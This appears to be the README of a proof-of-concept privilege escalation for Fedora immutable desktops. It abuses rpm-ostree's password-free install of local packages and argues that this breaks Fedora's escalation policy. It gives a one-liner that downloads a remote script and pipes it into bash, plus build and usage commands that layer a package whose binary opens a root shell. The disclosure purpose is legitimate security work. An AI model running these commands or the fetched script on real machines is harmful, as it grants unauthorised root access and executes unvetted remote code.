A privilege escalation proof-of-concept for Fedora immutable desktops, using the fact that `rpm-ostree install` doesn't ask for the user's password to install local packages.

## One-liner
```
bash <(curl https://raw.githubusercontent.com/rohanssrao/silverblue-privesc/main/privesc.sh)
```

To undo: `rpm-ostree remove privesc`

## More info

Fedora's [Privilege Escalation Policy](https://fedoraproject.org/wiki/Privilege_escalation_policy) says:

> The policy requires that any code which allows an unprivileged user account to perform, or cause to be performed, certain actions must require administrative authentication prior to the action being carried out.
> The actions are:
> - Add, remove, or downgrade any system-wide application or shared resource (packaged or otherwise), **with the exception that for installing Fedora-signed packages from administrator-configured repositories, the requirement to ask for a password is waived for members of the wheel group who are local and active.**

`privesc.rpm` is not Fedora-signed or from an administrator-configured repository, so this behavior can be considered a violation of the policy.

The relevant Polkit rule is [here](https://github.com/coreos/rpm-ostree/blob/3060372fd386f320e7733d7802b6a0fee38d39ae/src/daemon/org.projectatomic.rpmostree1.policy#L22).

Discussions: https://github.com/coreos/rpm-ostree/issues/745, https://github.com/coreos/rpm-ostree/pull/825

## Manual

**Requirements:**

```bash
dnf install rpmdevtools gcc glibc-static
```

**Building:**

```bash
rpmbuild --bb --define "_rpmdir $(pwd)" --define "_rpmfilename privesc.rpm" privesc.spec
```
This generates `privesc.rpm` in the current directory. Installing the package creates `/usr/bin/privesc` which simply runs bash as root.

**Usage:**

```bash
# Layer package
rpm-ostree install privesc.rpm
# Enter root shell. privesc is placed in the newest deployment
"$(ls -td /ostree/deploy/fedora/deploy/*/ | head -1)"/usr/bin/privesc
```
